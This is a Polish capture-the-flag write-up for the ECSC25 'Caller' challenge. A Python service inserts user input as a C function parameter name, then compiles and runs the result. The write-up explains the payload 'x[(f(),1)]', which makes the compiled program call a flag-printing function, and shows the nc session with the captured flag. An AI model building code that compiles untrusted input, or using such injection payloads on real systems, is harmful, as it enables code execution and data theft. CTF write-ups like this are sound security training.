# Caller
Zadanie podaje nam dwie rzeczy:
<br> Kod `caller.py`:
```python
import os
import uuid

def main():
    FLAG = open("flag.txt", 'r').read().encode()
    arg = input("> ")
    blacklist = ['{', '}', ';', '\n']
    if len(arg) > 10 or any([c in arg for c in blacklist]):
        print("Bad input!")
        return
    template = f"""
#include <stdio.h>
#include <string.h>

char* f(){{
    char* flag = "{FLAG}";
    printf("%s",flag);
    return flag;
}}

void g(char* {arg}){{}}

int main(){{
    g(NULL);
    return 0;
}}
"""
    name = "test"
    source = f"/tmp/{name}.c"
    outfile = f"/tmp/{name}"
    open(source, 'w').write(template)
    os.system(f"export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin && gcc {source} -o {outfile}")
    os.system(f"{outfile}")
    os.remove(source)
    os.remove(outfile)

main()
```

Oraz adres serwera na którym ta aplikacja działa:
<br>`nc caller.ecsc25.hack.cert.pl 5212`

# Jak zdobyć flagę
Widzimy, że program przyjmuje dane z `input()` i wstawia je bezpośrednio do nagłówka funkcji w języku C jako **nazwa argumentu**:
```void g(char* {arg}){{}}```
<br> Wymagania:
- max 10 znaków
- nie można użyć `{`,`}`,`;`,`\n`
<br>Funkcja `f()` zawiera flagę i wypisuje ją na standardowe wyjście:
```C
char* f(){
    char* flag = "b'FLAG{...}'";
    printf("%s",flag);
    return flag;
}
```
Naszym celem jest wywołanie funkcji `f()`
# Rozwiązanie
Skorzystamy ze składni C i efektu ubocznego w wyrażeniu:
<br>`x[(f(),1)]`
<br>Wstawione do nagłówka funkji da:
<br>`void g(char* x[(f(),1)]) {}`
<br>Dzięki temu: 
- wywołamy `f()` w kontekście indeksowania tablicy
- ignorujemy wynik `f()` (komiplator użyje tylko `1`)
- `f()` i tak zostanie wykonane i wypisze flagę

# Wynik
```bash
nc caller.ecsc25.hack.cert.pl 5212
> x[(f(),1)]
b'ecsc25{thats_some_weird_variable_name}'
```
